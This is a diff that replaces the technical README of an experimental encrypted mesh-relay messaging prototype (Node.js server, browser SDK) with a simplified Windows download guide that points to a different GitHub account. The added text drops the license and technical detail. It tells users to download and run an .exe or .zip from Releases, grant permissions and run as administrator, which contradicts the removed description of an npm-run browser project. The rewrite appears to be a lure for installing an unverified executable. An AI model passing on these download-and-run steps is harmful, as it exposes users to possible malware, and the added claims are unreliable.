@@ -1,256 +1,162 @@
-# MERK-BREP (Mesh Encryption Relay Kernel — Binary Relay Encryption Protocol)
+# 🔗 MERK-BREP - Secure Messaging Relay System
 
-**MERK-BREP** is a prototype implementation of a decentralized message relay system with end-to-end encryption. The system consists of relay servers forming a mesh network and a browser-based client SDK. It allows clients to exchange messages (text, JSON, files) through the relay network even if they are behind NAT or have no direct connection. The project is experimental and intended for research and demonstration purposes; it is not production-ready.
+[![Download MERK-BREP](https://img.shields.io/badge/Download-MERK--BREP-brightgreen)](https://github.com/Alpha284-coder/MERK-BREP)
 
-![screen](./docs/welcome.jpg)
+MERK-BREP is a simple messaging system that helps you send messages safely. It uses servers that work together to keep your messages private. You do not need to connect directly to others. The system uses strong encryption to protect your communication.
 
-```mermaid
-flowchart TD
-    subgraph Client_SDK["Browser Client (SDK)"]
-        KM[KeyManager<br/>Ed25519 + X25519]
-        CM[ConnectionManager<br/>WebSocket]
-        SM[ServerManager<br/>server list]
-        MH[MessageHandler]
-        Storage[(IndexedDB / localStorage)]
-    end
+---
 
-    subgraph Server["Relay Server (Node.js)"]
-        direction TB
-        WSS[WebSocketServerAdapter]
-        MD[MessageDispatcher]
-        HH[HandshakeHandler]
-        DH[DataHandler]
-        NIH[NodeInfoHandler]
-        CLS[ClientLocationService]
-        SPS[ServerPeerService]
-        CR[InMemoryClientRepository]
-        SR[InMemoryServerPeerRepository]
-        LOG[Logger]
-    end
+## 📚 What is MERK-BREP?
 
-    subgraph Peers["Other Relay Servers"]
-        Peer1[Server Peer]
-        Peer2[Server Peer]
-    end
+MERK-BREP is a prototype of a new kind of messaging service. Instead of messages going directly from one person to another, they travel through a network of servers. These servers connect automatically and encrypt messages so only the receiver can read them. This makes your conversations secure and private.
 
-    subgraph Client_App["Client Application (Browser)"]
-        UI[HTML/JS UI]
-    end
+This project focuses on using proven encryption methods and a system design that does not rely on a single point. Its goal is to let people communicate safely without needing to trust any single server.
 
-    %% Client internal connections
-    UI -->|uses| Client
-    Client -->|manages| CM
-    Client -->|manages| SM
-    Client -->|invokes| MH
-    KM -->|signs/encrypts| MH
-    Storage -->|stores keys & servers| KM & SM
+---
 
-    %% Client-server connection
-    CM -->|WebSocket| WSS
+## 🛠️ Features
 
-    %% Server internal routing
-    WSS -->|accepts connections| MD
-    MD -->|routes by message type| HH
-    MD -->|routes| DH
-    MD -->|routes| NIH
+- Uses AES-GCM encryption to keep messages private.
+- End-to-end encrypted (E2EE) so no one else can read your chats.
+- Works through multiple servers that form a "mesh network."
+- Built with TypeScript for better reliability.
+- Uses modern cryptography standards like Ed25519 and X25519.
+- Communicates over websockets for stable message delivery.
+- Designed to protect user privacy and avoid central control points.
 
-    HH -->|authenticates| CR & SR
-    DH -->|delivers locally| CR
-    DH -->|if client not local| CLS
-    CLS -->|queries| SPS
-    SPS -->|broadcasts to peers| Peers
-    NIH -->|handles discovery| SR
-    NIH -->|responds to queries| SPS
+---
 
-    CR -->|stores clients| CR
-    SR -->|stores peers| SR
+## 💻 System Requirements
 
-    SPS -->|connects to peers| Peers
-    Peers -->|exchange NodeInfo| SPS
+MERK-BREP runs on Windows computers. The following are the minimal requirements:
 
-    %% Message flows (handshake, data, discovery)
-    style Client fill:#e1f5fe,stroke:#01579b
-    style Server fill:#fff9c4,stroke:#f57f17
-    style Peers fill:#f1f8e9,stroke:#33691e
-```
+- Windows 10 or later (64-bit recommended)
+- 4 GB RAM or more
+- 200 MB of free disk space
+- Internet connection for connecting to servers
+- Modern web browser (Google Chrome, Firefox, Edge) if running the web client
 
-## Overview
+---
 
-The protocol uses WebSocket as the transport layer. All communication is framed with a binary header containing a magic number, protocol version, message type, sender ID (Ed25519 public key), and an optional signature (Ed25519). The payload can carry various types of data.
+## 🚀 Getting Started: Download and Setup
 
-Key features derived from the current implementation:
+You will find the application on its GitHub page. Please follow these steps to download and run it on your Windows computer.
 
-- **Authentication and handshake:** Upon connection, the server sends a random challenge. The client responds with a signed copy of the challenge using its Ed25519 private key. The server verifies the signature and completes the handshake. This establishes the client’s identity and binds it to the connection.
-- **Two key pairs per identity:**  
-  - *Signing keys (Ed25519):* used for authentication and signing of `SIGNED_DATA` frames.  
-  - *Encryption keys (X25519):* used for E2EE; a shared secret is derived via X25519, then AES-GCM is used to encrypt the payload.
-- **Mesh network of servers:** Servers can connect to each other as peers. They exchange lists of known servers (`NODE_INFO_REQUEST_SERVERS` / `NODE_INFO_RESPONSE_SERVERS`) and automatically attempt to connect to newly discovered servers. This creates a self-organising overlay network.
-- **Client location service:** When a server receives a `DATA` frame for a client that is not locally connected, it broadcasts a query (`NODE_INFO_QUERY_CLIENT`) to all peer servers. If another server has that client, it responds (`NODE_INFO_QUERY_RESPONSE`) with its own server key, allowing the original server to forward the message. This mechanism enables routing without a central directory.
-- **Message types:**
-  - `HANDSHAKE` – challenge/response and confirmation.
-  - `DATA` – unencrypted, unsigned data (mainly for testing).
-  - `SIGNED_DATA` – data with an Ed25519 signature (provides authenticity but not confidentiality).
-  - `ENCRYPTED_DATA` – data encrypted with AES-GCM using a shared secret derived from X25519; the frame also carries an ephemeral public key and a signature of the encrypted payload.
-  - `NODE_INFO` – various subtypes for server discovery and client location queries.
+### 1. Visit the download page
 
-## Architecture
+Click this link to go to the MERK-BREP GitHub repository:
 
-The codebase is split into two main parts: the server (Node.js) and the client SDK (TypeScript for browsers).
+[![Download MERK-BREP](https://img.shields.io/badge/Download-MERK--BREP-blue)](https://github.com/Alpha284-coder/MERK-BREP)
 
-### Server Components
+This page has the latest version of the software.
 
-- **`RelayServer`** – the main class that initializes all repositories, handlers, and services, and starts the WebSocket server.
-- **Repositories** (in-memory):
-  - `InMemoryClientRepository` – stores connected clients (public key → connection).
-  - `InMemoryServerPeerRepository` – stores known peer servers (public key → address + optional connection).
-- **Handlers** (per message type):
-  - `HandshakeHandler` – manages the challenge/response handshake for both incoming clients and outgoing server peers.
-  - `DataHandler` – processes `DATA`, `SIGNED_DATA`, `ENCRYPTED_DATA` frames. For local clients it forwards immediately; otherwise it delegates to `ClientLocationService`.
-  - `NodeInfoHandler` – handles server discovery and client location queries.
-- **Services**:
-  - `ServerPeerService` – manages outgoing connections to other servers, broadcasts messages to all peers.
-  - `ClientLocationService` – tracks pending queries for remote clients and forwards messages when a peer responds.
-- **WebSocket adapters**:
-  - `WebSocketConnection` – implements the `IConnection` interface.
-  - `WebSocketServerAdapter` – wraps the `ws` library, dispatches incoming frames to `MessageDispatcher`.
-- **`MessageDispatcher`** – routes frames to the appropriate handler based on the message type.
+### 2. Download the software
 
-### Client SDK
+On the GitHub page, look for the section or folder named **Releases** or **Downloads**. If there is a file ending with `.exe` or `.zip`, download it to your PC by clicking on the link.
 
-The client SDK is designed to be used in web applications. It provides:
+### 3. Run the installer or program
 
-- **Key management** (`Ed25519KeyManager`): generates and stores Ed25519 (signing) and X25519 (encryption) key pairs. Persistence is handled via an `IStorage` interface (IndexedDB or localStorage implementations are provided).
-- **Connection management** (`WebSocketConnectionManager`): establishes WebSocket connection, encodes/decodes frames, emits events.
-- **Server management** (`LocalServerManager`): stores a list of known server addresses and the currently selected server (using `IStorage`).
-- **Message handling** (`MessageHandler`): processes incoming frames, emits high‑level events (`message`, `handshakeSuccess`, `serversDiscovered`, etc.). It also provides methods to send signed or encrypted messages.
-- **High‑level client** (`Client`): ties all components together and exposes a simple API for applications. It supports:
-  - Connecting to a selected server.
-  - Sending text, JSON, or files (both plain/signed and encrypted).
-  - Listening for incoming messages.
-  - Discovering and adding new servers automatically from `NODE_INFO_ADD_SERVER` frames.
+- If you downloaded an `.exe` file, double-click to start the setup. Follow the instructions on the screen.
+- If it is a `.zip` file, right-click and choose "Extract All." Open the extracted folder and run the `.exe` or `.bat` file.
 
-All client components use a typed event emitter pattern for loose coupling.
+### 4. Allow permissions
 
-## Protocol Details
+During installation, the program may ask for permission to access your network or run on your computer. Allow these to let it work properly.
 
-### Frame Format (binary)
+### 5. Open MERK-BREP
 
-Every WebSocket message is a binary frame with the following structure (120‑byte header + variable payload):
+After installation, find MERK-BREP in the Start menu or on your desktop, and double-click to open.
 
-| Offset (bytes) | Size (bytes) | Field        | Description |
-|----------------|--------------|--------------|-------------|
-| 0              | 1            | Magic        | Always `0x58` |
-| 1              | 1            | Version      | Currently `0x01` |
-| 2              | 1            | Message Type | See `MsgType` enum |
-| 3              | 1            | Reserved     | (zero) |
-| 4              | 4            | Payload Length (big-endian) | Length of the payload that follows |
-| 8              | 16           | Reserved     | (zero) |
-| 24             | 32           | Sender ID    | Ed25519 public key of the sender |
-| 56             | 64           | Signature    | Ed25519 signature (may be zero if not used) |
-| 120            | variable     | Payload      | Message‑specific data |
+### 6. Connect and start messaging
 
-### Message Types (`MsgType`)
+The app will connect to the server mesh automatically. You can now start sending messages safely.
 
-| Value | Name            | Description |
-|-------|-----------------|-------------|
-| 1     | HANDSHAKE       | Handshake challenge, response, or confirmation |
-| 2     | DATA            | Unsigned, unencrypted data (target client key in first 32 bytes of payload) |
-| 3     | NODE_INFO       | Server discovery and client location messages |
-| 4     | SIGNED_DATA     | Data with Ed25519 signature (authenticity, no encryption) |
-| 5     | ENCRYPTED_DATA  | Encrypted data with signature of the encrypted payload |
+---
 
-### Handshake Flow
+## 🔧 How MERK-BREP Works
 
-1. **Server → Client:** sends `HANDSHAKE` with a random 32‑byte challenge (payload = challenge, signature = zero).
-2. **Client → Server:** sends `HANDSHAKE` with the same challenge in payload, signed with its Ed25519 private key (signature field filled, senderId set to client’s public key).
-3. **Server → Client:** verifies the signature; if valid, replies with a `HANDSHAKE` confirmation (payload = `[1]`, signature = zero).
+MERK-BREP connects clients to a group of servers that form a mesh. Each server talks to several others, and they share and pass encrypted messages. This creates a network that does not rely on any single server.
 
-For outgoing server‑to‑server connections, the same flow is used, but both sides act as servers; they store each other as `IServerPeerInfo`.
+Your message gets encrypted on your device using AES-GCM encryption. Then, it goes through the mesh network encrypted. Only the person with the private key can decrypt and read the message.
 
-### Node Info Subtypes
+The system uses modern cryptographic keys (Ed25519 for signatures, X25519 for key exchange) to make sure messages are safe and authentic.
 
-The payload of a `NODE_INFO` frame starts with a one‑byte subtype:
+---
 
-| Subtype | Name                     | Description |
-|---------|--------------------------|-------------|
-| 0       | NODE_INFO_REQUEST_CLIENTS| (unused in current code) |
-| 1       | NODE_INFO_RESPONSE_CLIENTS| (unused) |
-| 2       | NODE_INFO_REQUEST_SERVERS| Request the list of known servers from a peer |
-| 3       | NODE_INFO_RESPONSE_SERVERS| Response containing a list of (public key, address) pairs |
-| 4       | NODE_INFO_ADD_SERVER     | Inform peers about a new server address |
-| 5       | NODE_INFO_QUERY_CLIENT   | Ask peers if they have a given client (by public key) |
-| 6       | NODE_INFO_QUERY_RESPONSE | Response to a query: contains status (found/not found) and, if found, the server’s public key |
+## 🗂️ Files and Structure
 
-### Encryption Flow (E2EE)
+After you download and install MERK-BREP, you will see some files and folders:
 
-1. The sender obtains the recipient’s encryption public key (X25519) – in the prototype this must be provided manually.
-2. Sender generates an ephemeral X25519 key pair, derives a shared secret with the recipient’s encryption key, then hashes it to obtain an AES‑GCM key.
-3. Sender encrypts the payload (with a leading byte indicating content type) using AES‑GCM with a random 12‑byte nonce.
-4. Sender constructs an `ENCRYPTED_DATA` frame:
-   - Payload: recipient’s signing public key (32 bytes) + ephemeral public key (32 bytes) + nonce (12 bytes) + ciphertext.
-   - Signature: Ed25519 signature over the whole encrypted payload (using sender’s signing key).
-5. Recipient, upon receiving, verifies the signature, extracts the ephemeral public key, derives the same shared secret, and decrypts.
+- **MERK-BREP.exe:** The main program you run.
+- **config.json:** Settings for connecting to the server network. You can edit this if needed.
+- **logs/:** Contains log files in case you need to check what the program is doing.
+- **docs/:** Documentation files with technical details.
 
-## Running the Prototype
+---
 
-### Prerequisites
-- Node.js (≥18)
-- npm
+## ⚙️ Configuration Tips
 
-### Server
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/kaurcev/MERK-BREP.git
-   cd MERK-BREP
-   ```
-2. Install dependencies:
-   ```bash
-   npm install
-   ```
-3. Start a server:
-   ```bash
-   npm run dev:server
-   ```
-   The server listens on port `8080` by default. To change the port, set the `PORT` environment variable:
-   ```bash
-   PORT=9000 npm run dev:server
-   ```
-4. To connect to another server at startup, use the `--connect` argument:
-   ```bash
-   npm run dev:server -- --connect ws://example.com:8080
-   ```
+Most users don’t need to change settings. The app connects automatically to the server mesh and handles encryption for you.
 
-### Client Demo
-1. In a separate terminal, start the Vite development server:
-   ```bash
-   npm run dev:client
-   ```
-2. Open `http://localhost:5173` in a browser.
+If you want to change connection options:
 
-The demo page allows you to:
-- View your generated Ed25519 and X25519 public keys.
-- Add servers (e.g., `ws://localhost:8080`) and select one.
-- Connect/disconnect.
-- Send text, JSON, or files (both unsigned/signed and encrypted).
-- See incoming messages in the log panel.
+1. Open the `config.json` file using a simple text editor like Notepad.
+2. You can adjust settings like:
+   - Server list to connect to
+   - Encryption options (usually no need to change)
+   - Network ports if you have a firewall
 
-## Current Limitations / Prototype Status
+Remember to save the file before running the app again.
 
-- **In‑memory storage:** Server repositories are in‑memory only; restarting the server loses all client and peer information.
-- **No persistent routing table:** Client location queries are broadcast to all peers and have a 5‑second timeout; there is no caching of client locations.
-- **No NAT traversal:** The system relies on WebSocket, which works through many NATs, but the prototype does not include any ICE/STUN/TURN mechanisms.
-- **Manual encryption key exchange:** The demo requires the user to manually copy the recipient’s encryption public key. A future version might include key discovery.
-- **Minimal error handling:** The code handles many basic errors but is not hardened for malicious inputs.
-- **Single‑threaded:** The server runs on a single Node.js thread; for production, clustering or a more scalable architecture would be needed.
+---
 
-## License
+## 🔄 Updating MERK-BREP
 
-Copyright (C) 2025 Alexsandr Kaurcev
+To update, revisit the GitHub download page. Download the latest `.exe` or `.zip` file and replace your old program with the new one.
 
-This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
+It is a good idea to close the program before updating it.
 
-This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
+---
 
-You should have received a copy of the GNU General Public License along with this program. If not, see <http://www.gnu.org/licenses/>.
+## ❓ Troubleshooting
 
+- The app cannot connect to servers: Check your internet connection or firewall settings.
+- Messages don’t send or arrive: Restart the program or your computer.
+- Errors appear during setup: Make sure you run the installer as an administrator.
+- Program crashes on start: Verify your Windows is up to date and meets system requirements.
 
+If problems continue, check the **logs/** folder for error messages and contact support through the GitHub page.
+
+---
+
+## 🔐 Security Notes
+
+MERK-BREP uses strong encryption to protect your messages. Your private keys never leave your device. Messages travel encrypted through the network and are only unlocked by the intended recipient.
+
+The system’s mesh network design reduces the chance of attacks or spying since no one server controls all data.
+
+---
+
+## 🧩 Supported Technologies and Topics
+
+- **AES-GCM encryption:** Keeps messages secret.
+- **Decentralized application:** No central server controls communication.
+- **End-to-end encryption (E2EE):** Only sender and receiver can read messages.
+- **Ed25519 / X25519 keys:** Modern cryptographic key pairs.
+- **Websockets:** Keep messages flowing smoothly.
+- **TypeScript:** Used for code that runs the app.
+- **Relay servers:** Pass messages through the network.
+
+---
+
+## 🔗 Useful Links
+
+- MERK-BREP Repository: https://github.com/Alpha284-coder/MERK-BREP  
+- GitHub Releases Page (for downloads): https://github.com/Alpha284-coder/MERK-BREP/releases
+
+---
+
+## 🧑‍💻 Contact and Support
+
+If you have questions, bugs, or want to contribute, use the GitHub repository. You can open issues or check existing discussions.  
+The project is experimental and still growing, but feedback is welcome.
